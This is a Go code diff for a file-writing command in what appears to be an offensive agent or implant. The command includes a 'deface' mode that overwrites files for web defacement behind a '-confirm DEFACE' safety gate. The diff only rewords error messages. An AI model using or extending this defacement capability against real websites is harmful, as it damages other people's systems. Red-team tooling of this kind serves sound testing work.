@@ -37,7 +37,7 @@ func (c *WriteFileCommand) Execute(task structs.Task) structs.CommandResult {
 	}
 
 	if args.Path == "" {
-		return errorResult("Error: path is required")
+		return errorResult("path is required")
 	}
 
 	if args.Action == "deface" {
@@ -45,7 +45,7 @@ func (c *WriteFileCommand) Execute(task structs.Task) structs.CommandResult {
 	}
 
 	if args.Content == "" {
-		return errorResult("Error: content is required")
+		return errorResult("content is required")
 	}
 
 	// Determine the data to write
@@ -53,7 +53,7 @@ func (c *WriteFileCommand) Execute(task structs.Task) structs.CommandResult {
 	if args.Base64 {
 		decoded, err := base64.StdEncoding.DecodeString(args.Content)
 		if err != nil {
-			return errorf("Error decoding base64: %v", err)
+			return errorf("decoding base64: %v", err)
 		}
 		data = decoded
 	} else {
@@ -64,7 +64,7 @@ func (c *WriteFileCommand) Execute(task structs.Task) structs.CommandResult {
 	if args.MkDirs {
 		dir := filepath.Dir(args.Path)
 		if err := os.MkdirAll(dir, 0755); err != nil {
-			return errorf("Error creating directories: %v", err)
+			return errorf("creating directories: %v", err)
 		}
 	}
 
@@ -78,13 +78,13 @@ func (c *WriteFileCommand) Execute(task structs.Task) structs.CommandResult {
 
 	f, err := os.OpenFile(args.Path, flags, 0644)
 	if err != nil {
-		return errorf("Error opening file: %v", err)
+		return errorf("opening file: %v", err)
 	}
 	defer f.Close()
 
 	n, err := f.Write(data)
 	if err != nil {
-		return errorf("Error writing file: %v", err)
+		return errorf("writing file: %v", err)
 	}
 
 	action := "Wrote"
@@ -100,7 +100,7 @@ func (c *WriteFileCommand) Execute(task structs.Task) structs.CommandResult {
 // Safety gate: -confirm DEFACE required.
 func writeFileDeface(args writeFileArgs) structs.CommandResult {
 	if args.Confirm != "DEFACE" {
-		return errorResult("Error: deface requires -confirm DEFACE (safety gate for web defacement)")
+		return errorResult("deface requires -confirm DEFACE (safety gate for web defacement)")
 	}
 
 	content := args.Content
@@ -123,13 +123,13 @@ func writeFileDeface(args writeFileArgs) structs.CommandResult {
 
 	f, err := os.OpenFile(args.Path, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, 0644)
 	if err != nil {
-		return errorf("Error opening %s for defacement: %v", args.Path, err)
+		return errorf("opening %s for defacement: %v", args.Path, err)
 	}
 	defer f.Close()
 
 	n, err := f.Write([]byte(content))
 	if err != nil {
-		return errorf("Error writing defacement: %v", err)
+		return errorf("writing defacement: %v", err)
 	}
 
 	return successf("[+] Defaced: %s (%d bytes written%s)", args.Path, n, backupInfo)
